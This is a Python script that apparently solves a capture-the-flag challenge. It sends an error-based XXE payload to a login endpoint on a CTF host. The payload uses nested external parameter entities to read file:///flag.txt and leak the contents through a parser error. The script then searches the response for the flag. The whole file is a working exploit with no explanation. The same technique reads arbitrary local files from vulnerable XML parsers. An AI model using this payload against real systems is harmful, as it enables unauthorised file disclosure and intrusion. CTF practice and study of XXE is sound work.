import requests

if __name__ == '__main__':
    url = 'http://shellter.ctfz.one/login.php'
    pl = '''
    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[ 
  <!ELEMENT message ANY >
  <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "file:///flag.txt">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%NUMBER;
]> 
<root>1</root>
    '''
    print('Sending payload...')
    r = requests.post(url, data=pl)
    print(url + " -> " + str(r.status_code))
    print("Searching for flag...")
    if r.text.find('CTFZone') == -1:
        print("ALERT! I DONT SEE THE FLAG!")
        print(r.text)
    else:
        print("IT\'S OK, WE HAVE THE FLAG")
        print(r.text)
